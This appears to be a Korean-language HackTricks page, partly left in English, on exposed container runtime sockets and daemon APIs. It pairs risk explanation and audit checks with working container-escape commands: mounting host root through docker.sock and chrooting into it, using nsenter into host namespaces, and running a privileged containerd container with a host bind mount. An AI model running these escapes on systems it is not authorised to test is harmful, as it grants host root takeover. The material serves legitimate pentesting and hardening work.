# 런타임 API 및 데몬 노출

{{#include ../../../banners/hacktricks-training.md}}

## 개요

많은 실제 컨테이너 침해는 전혀 네임스페이스 탈출로 시작하지 않습니다. 대신 런타임 제어 평면에 대한 접근으로 시작합니다. 워크로드가 마운트된 Unix 소켓이나 노출된 TCP 리스너를 통해 `dockerd`, `containerd`, CRI-O, Podman, 또는 kubelet과 통신할 수 있다면, 공격자는 더 높은 권한의 새 컨테이너를 요청하거나 호스트 파일시스템을 마운트하거나 호스트 네임스페이스에 합류하거나 민감한 노드 정보를 가져올 수 있습니다. 이런 경우 런타임 API가 실제 보안 경계이며, 이를 침해하는 것은 기능적으로 호스트 침해와 거의 동일합니다.

이 때문에 런타임 소켓 노출은 커널 보호와 별도로 문서화되어야 합니다. 일반적인 seccomp, capabilities, 및 MAC confinement이 적용된 컨테이너라도 내부에 `/var/run/docker.sock` 또는 `/run/containerd/containerd.sock`가 마운트되어 있으면 호스트 침해까지 한 번의 API 호출밖에 남지 않을 수 있습니다. 현재 컨테이너의 커널 격리가 설계대로 작동하고 있더라도 런타임 관리 평면이 완전히 노출되어 있을 수 있습니다.

## 데몬 접근 모델

Docker Engine은 전통적으로 로컬 Unix 소켓 `unix:///var/run/docker.sock`을 통해 권한 있는 API를 노출합니다. 역사적으로는 `tcp://0.0.0.0:2375` 같은 TCP 리스너나 포트 `2376`의 TLS 보호 리스너를 통해 원격으로 노출되기도 했습니다. 강력한 TLS 및 클라이언트 인증 없이 데몬을 원격으로 노출하면 사실상 Docker API가 원격 루트 인터페이스가 됩니다.

containerd, CRI-O, Podman, 그리고 kubelet도 유사한 고영향 표면을 노출합니다. 이름과 워크플로우는 다르지만 논리는 동일합니다. 인터페이스가 호출자에게 워크로드를 생성하게 하거나 호스트 경로를 마운트하게 하거나 자격 증명을 가져오게 하거나 실행 중인 컨테이너를 변경하게 한다면, 그 인터페이스는 권한 있는 관리 채널이며 그에 맞게 취급해야 합니다.

확인해야 할 일반적인 로컬 경로는 다음과 같습니다:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
구형이거나 더 특화된 스택은 `dockershim.sock`, `frakti.sock`, 또는 `rktlet.sock` 같은 엔드포인트를 노출할 수 있습니다. 이러한 것들은 최신 환경에서는 덜 흔하지만, 발견되면 일반 애플리케이션 소켓이 아니라 런타임 제어 지점으로 간주해야 하므로 동일한 주의로 다뤄야 합니다.

## Secure Remote Access

데몬을 로컬 소켓 밖으로 노출해야 하는 경우, 연결은 TLS로 보호되어야 하며 가능하면 상호 인증(mutual authentication)을 사용해 데몬이 클라이언트를 검증하고 클라이언트가 데몬을 검증하도록 해야 합니다. 편의를 위해 Docker 데몬을 평문 HTTP로 여는 오래된 관행은 컨테이너 관리에서 가장 위험한 실수 중 하나입니다. API 표면이 직접적으로 특권 컨테이너를 생성할 만큼 강력하기 때문입니다.

The historical Docker configuration pattern looked like:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
On systemd-based hosts, daemon communication may also appear as `fd://`, meaning the process inherits a pre-opened socket from systemd rather than binding it directly itself. 중요한 교훈은 정확한 구문이 아니라 보안상 결과이다. daemon이 엄격히 권한이 제한된 local socket을 넘어 수신하는 순간, 전송 보안(transport security)과 클라이언트 인증(client authentication)은 선택적 하드닝이 아니라 필수가 된다.

## 악용

If a runtime socket is present, confirm which one it is, whether a compatible client exists, and whether raw HTTP or gRPC access is possible:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
이 명령들은 dead path, 마운트되어 있으나 접근 불가능한 socket, 그리고 live privileged API를 구별할 수 있기 때문에 유용하다. client가 성공하면, 다음 질문은 API가 host bind mount 또는 host namespace sharing을 사용해 새 container를 실행할 수 있는지이다.

### 전체 예: Docker Socket에서 Host Root로

If `docker.sock` is reachable, the classical escape is to start a new container that mounts the host root filesystem and then `chroot` into it:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
이는 Docker daemon을 통해 호스트 루트로의 직접 실행을 제공합니다. 영향은 파일 읽기에만 국한되지 않습니다. 새 컨테이너 내부에 진입하면 공격자는 호스트 파일을 변경하고, credentials를 수집하며, persistence를 심거나 추가적인 privileged workloads를 시작할 수 있습니다.

### 전체 예시: Docker Socket To Host Namespaces

공격자가 filesystem-only 접근 대신 네임스페이스 진입을 선호한다면:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
이 경로는 현재 컨테이너를 악용하는 대신 runtime에 명시적으로 host-namespace를 노출한 새 컨테이너를 생성하도록 요청하여 호스트에 도달합니다.

### 전체 예시: containerd Socket

마운트된 `containerd` 소켓은 보통 똑같이 위험합니다:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
영향은 다시 호스트 권한 탈취입니다. Docker 전용 도구가 없더라도 다른 런타임 API가 동일한 관리 권한을 제공할 수 있습니다.

## 검사

이 검사들의 목적은 컨테이너가 신뢰 경계 밖에 있어야 할 어떤 관리 평면(management plane)에 도달할 수 있는지를 확인하는 것입니다.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
여기서 주목할 점:

- 마운트된 runtime 소켓은 단순한 정보 유출보다 보통 직접적인 관리 권한 수단임.
- TLS 없이 `2375`에서 수신 중인 TCP 리스너는 원격 침해(remote-compromise) 상태로 간주해야 함.
- `DOCKER_HOST`와 같은 환경 변수는 워크로드가 의도적으로 호스트 runtime과 통신하도록 설계되었음을 자주 드러냄.

## 런타임 기본값

| 런타임 / 플랫폼 | 기본 상태 | 기본 동작 | 일반적인 수동 약화 방법 |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 로컬 Unix 소켓 | `dockerd`는 로컬 소켓에서 수신하며 데몬은 일반적으로 root 권한으로 실행됨 | `/var/run/docker.sock` 마운트, `tcp://...:2375` 노출, `2376`에서 TLS가 약하거나 없음 |
| Podman | 기본적으로 데몬리스 CLI | 일반적인 로컬 사용에는 장기간 실행되는 특권 데몬이 필요하지 않음; `podman system service`가 활성화되면 API 소켓이 여전히 노출될 수 있음 | `podman.sock` 노출, 서비스를 광범위하게 실행, root 권한의 API 사용 |
| containerd | 로컬 특권 소켓 | 로컬 소켓을 통해 관리자 API가 노출되며 보통 상위 레벨 도구에서 사용됨 | `containerd.sock` 마운트, 광범위한 `ctr` 또는 `nerdctl` 접근, 특권 있는 네임스페이스 노출 |
| CRI-O | 로컬 특권 소켓 | CRI 엔드포인트는 노드-로컬 신뢰 구성요소를 위한 것임 | `crio.sock` 마운트, CRI 엔드포인트를 신뢰할 수 없는 워크로드에 노출 |
| Kubernetes kubelet | 노드-로컬 관리 API | Kubelet은 Pods에서 광범위하게 접근 가능해선 안 됨; 접근 시 authn/authz에 따라 pod 상태, 자격 증명 및 실행 기능이 노출될 수 있음 | kubelet 소켓이나 인증서 마운트, 약한 kubelet 인증, 호스트 네트워킹과 접근 가능한 kubelet 엔드포인트 |
{{#include ../../../banners/hacktricks-training.md}}
